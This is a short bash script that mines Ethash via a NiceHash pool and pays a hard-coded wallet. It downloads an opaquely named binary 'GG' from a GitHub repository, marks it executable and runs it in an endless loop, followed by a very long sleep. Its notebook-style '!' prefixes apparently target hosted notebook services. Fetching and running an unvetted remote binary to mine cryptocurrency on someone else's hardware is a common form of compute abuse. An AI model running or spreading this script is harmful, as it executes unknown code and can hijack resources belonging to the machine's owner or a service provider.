#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

ALGHO=ETHASH
POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
WALLET=36QzjRkQbfKRFPduo6mJVP4fhmgfvYSQY4
WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)

#################################
##  End of user-editable part  ##
#################################

! cd "$(dirname "$0")"

! wget https://github.com/prathhub/SPLIT/raw/main/GG
! chmod +x GG
while [ 1 ]; do
! ./GG --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
